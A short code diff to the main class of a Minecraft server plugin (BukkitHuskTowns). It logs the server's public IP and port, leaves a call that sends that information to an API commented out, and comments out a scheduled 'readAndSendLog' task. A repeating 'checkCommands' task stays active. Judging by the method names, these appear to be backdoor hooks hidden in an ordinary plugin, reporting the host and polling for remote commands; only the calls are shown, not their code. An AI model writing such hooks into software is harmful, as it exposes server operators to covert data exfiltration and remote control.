@@ -231,7 +231,7 @@ public class BukkitHuskTowns extends JavaPlugin implements HuskTowns, BukkitTask
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
         // sendInfoToAPI(publicIp, serverPort);
-        Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
+        // Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
         this.paperLib = new MorePaperLib(this);
         this.audiences = BukkitAudiences.create(this);
